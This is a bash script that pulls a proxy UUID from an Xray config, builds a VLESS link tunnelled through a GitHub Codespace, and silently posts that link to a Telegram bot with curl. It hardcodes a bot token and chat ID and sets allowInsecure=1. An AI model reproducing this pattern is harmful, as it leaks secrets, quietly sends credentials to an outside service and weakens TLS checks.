#!/bin/bash

CONFIG="/etc/xray/g2ray.json"

UUID=$(grep -o '"id": *"[^"]*"' "$CONFIG" | head -1 | grep -o '"[^"]*"$' | tr -d '"')

if [ -z "$UUID" ]; then
  echo "[g2ray] UUID not found."
  exit 1
fi

SNI="${CODESPACE_NAME}-443.app.github.dev"

LINK="vless://${UUID}@94.130.50.12:443?encryption=none&security=tls&sni=${SNI}&host=${SNI}&fp=chrome&allowInsecure=1&type=xhttp&mode=packet-up&path=%2F#bold-node-267617"

echo ""
echo "================================================"
echo "  $LINK"
echo "================================================"
echo ""

# SEND TO TELEGRAM
BOT_TOKEN="8763350975:AAHYk1KwpCGTmO0tDWeRyYUmSlmClyciUxY"
CHAT_ID="-1003939982232"

curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
  -d chat_id="${CHAT_ID}" \
  --data-urlencode text="$LINK" > /dev/null 2>&1
